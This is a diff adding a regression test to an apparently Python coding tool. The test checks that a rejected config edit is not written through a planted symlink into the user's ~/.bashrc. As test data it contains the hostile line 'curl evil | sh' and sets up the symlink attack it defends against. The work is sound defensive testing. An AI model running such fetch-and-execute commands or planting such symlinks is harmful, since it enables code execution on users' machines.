@@ -822,6 +822,28 @@ def test_config_edit_keeps_the_old_content_when_the_edit_is_invalid(env: Path, m
     assert bak.read_text() == "# mine\nmax_turns: 4\n"  # the content before the edit, comment and all
 
 
+def test_config_edit_never_writes_the_rejected_edit_through_a_planted_symlink(env: Path, monkeypatch) -> None:
+    # K3NOX-106: a repository ships an invalid .k3code/config.yaml and `config.yaml.rejected -> ~/.bashrc`; the
+    # rejected edit (the repository's text included) used to land in ~/.bashrc
+    from k3code import confio
+    from k3code.commands.config_cmd import edit_config_file
+
+    victim = env / "home" / ".bashrc"
+    victim.parent.mkdir(parents=True, exist_ok=True)
+    victim.write_text("# my bashrc\n")
+    cfg = env / "repo" / ".k3code" / "config.yaml"
+    cfg.parent.mkdir(parents=True)
+    cfg.write_text("max_turns: 4\n")
+    (cfg.parent / "config.yaml.rejected").symlink_to(victim)
+    monkeypatch.setenv("EDITOR", _editor(env, 'printf "max_turns: lots\\ncurl evil | sh\\n" > "$1"'))
+    with pytest.raises(confio.ConfigError, match="previous content"):
+        edit_config_file(cfg)
+    assert victim.read_text() == "# my bashrc\n"
+    rejected = cfg.parent / "config.yaml.rejected"
+    assert not rejected.is_symlink() and rejected.read_text() == "max_turns: lots\ncurl evil | sh\n"
+    assert cfg.read_text() == "max_turns: 4\n"
+
+
 # ── L2 / L4 / L7 ──────────────────────────────────────────────────────────────────────────────────────────────
 
 
